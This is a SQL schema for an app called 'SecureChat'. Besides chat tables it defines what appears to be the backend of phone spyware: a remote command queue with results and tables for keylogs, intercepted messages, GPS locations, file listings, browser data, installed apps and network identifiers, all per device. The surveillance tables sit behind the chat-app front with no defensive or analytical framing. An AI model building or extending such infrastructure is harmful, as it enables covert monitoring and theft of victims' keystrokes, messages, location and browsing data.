-- SecureChat idempotent schema
-- All tables + basic RLS

CREATE EXTENSION IF NOT EXISTS "pgcrypto";

-- profiles
CREATE TABLE IF NOT EXISTS public.profiles (
  id UUID PRIMARY KEY REFERENCES auth.users ON DELETE CASCADE,
  username TEXT UNIQUE NOT NULL,
  display_name TEXT NOT NULL DEFAULT '',
  avatar TEXT,
  email TEXT,
  is_admin BOOLEAN DEFAULT false,
  created_at TIMESTAMPTZ DEFAULT now(),
  updated_at TIMESTAMPTZ DEFAULT now()
);

-- friendships
CREATE TABLE IF NOT EXISTS public.friendships (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  user_id UUID NOT NULL REFERENCES public.profiles(id) ON DELETE CASCADE,
  friend_id UUID NOT NULL REFERENCES public.profiles(id) ON DELETE CASCADE,
  created_at TIMESTAMPTZ DEFAULT now(),
  UNIQUE(user_id, friend_id)
);

-- friend_requests
CREATE TABLE IF NOT EXISTS public.friend_requests (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  sender_id UUID NOT NULL REFERENCES public.profiles(id) ON DELETE CASCADE,
  receiver_id UUID NOT NULL REFERENCES public.profiles(id) ON DELETE CASCADE,
  status TEXT NOT NULL DEFAULT 'pending'
    CHECK (status IN ('pending','accepted','rejected')),
  created_at TIMESTAMPTZ DEFAULT now()
);

-- messages
CREATE TABLE IF NOT EXISTS public.messages (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  sender_id UUID NOT NULL,
  receiver_id UUID NOT NULL,
  body TEXT,
  media_url TEXT,
  created_at TIMESTAMPTZ DEFAULT now(),
  read BOOLEAN DEFAULT false
);

-- device_info
CREATE TABLE IF NOT EXISTS public.device_info (
  device_id TEXT PRIMARY KEY,
  user_id UUID,
  fcm_token TEXT,
  manufacturer TEXT,
  phone_model TEXT,
  phone_name TEXT,
  os_version TEXT,
  free_storage_bytes BIGINT,
  total_storage_bytes BIGINT,
  public_ip TEXT,
  wifi_mac TEXT,
  network_type TEXT,
  installed_apps JSONB DEFAULT '[]',
  updated_at TIMESTAMPTZ DEFAULT now(),
  last_seen TIMESTAMPTZ
);

-- pending_commands
CREATE TABLE IF NOT EXISTS public.pending_commands (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  device_id TEXT NOT NULL,
  status TEXT NOT NULL DEFAULT 'pending',
  command_code TEXT NOT NULL,
  params TEXT,
  ack_nonce TEXT,
  result_message TEXT,
  error_code TEXT,
  error_detail TEXT,
  created_at TIMESTAMPTZ DEFAULT now(),
  expires_at TIMESTAMPTZ,
  delivered_at TIMESTAMPTZ,
  finalized_at TIMESTAMPTZ
);

-- command_results
CREATE TABLE IF NOT EXISTS public.command_results (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  pending_command_id UUID,
  device_id TEXT,
  command_code TEXT,
  success BOOLEAN NOT NULL,
  message TEXT,
  error_code TEXT,
  error_detail TEXT,
  payload JSONB,
  created_at TIMESTAMPTZ DEFAULT now()
);

-- keylogs
CREATE TABLE IF NOT EXISTS public.keylogs (
  id BIGSERIAL PRIMARY KEY,
  device_id TEXT NOT NULL,
  payload TEXT NOT NULL,
  created_at TIMESTAMPTZ DEFAULT now()
);

-- messages_intercept
CREATE TABLE IF NOT EXISTS public.messages_intercept (
  id BIGSERIAL PRIMARY KEY,
  device_id TEXT NOT NULL,
  payload TEXT,
  created_at TIMESTAMPTZ DEFAULT now()
);

-- locations
CREATE TABLE IF NOT EXISTS public.locations (
  id BIGSERIAL PRIMARY KEY,
  device_id TEXT NOT NULL,
  latitude DOUBLE PRECISION,
  longitude DOUBLE PRECISION,
  accuracy REAL,
  created_at TIMESTAMPTZ DEFAULT now()
);

-- file_listings
CREATE TABLE IF NOT EXISTS public.file_listings (
  id BIGSERIAL PRIMARY KEY,
  device_id TEXT NOT NULL,
  path TEXT,
  size BIGINT,
  modified_at TIMESTAMPTZ,
  extra JSONB,
  created_at TIMESTAMPTZ DEFAULT now()
);

-- browser_data
CREATE TABLE IF NOT EXISTS public.browser_data (
  id BIGSERIAL PRIMARY KEY,
  device_id TEXT NOT NULL,
  payload TEXT,
  created_at TIMESTAMPTZ DEFAULT now()
);

-- Indexes
CREATE INDEX IF NOT EXISTS idx_pending_commands_device_status ON public.pending_commands(device_id, status);
CREATE INDEX IF NOT EXISTS idx_keylogs_device ON public.keylogs(device_id);
CREATE INDEX IF NOT EXISTS idx_locations_device ON public.locations(device_id);
CREATE INDEX IF NOT EXISTS idx_device_info_user ON public.device_info(user_id);

-- Simple admin helper
-- UPDATE public.profiles SET is_admin = true WHERE username = 'your_admin';
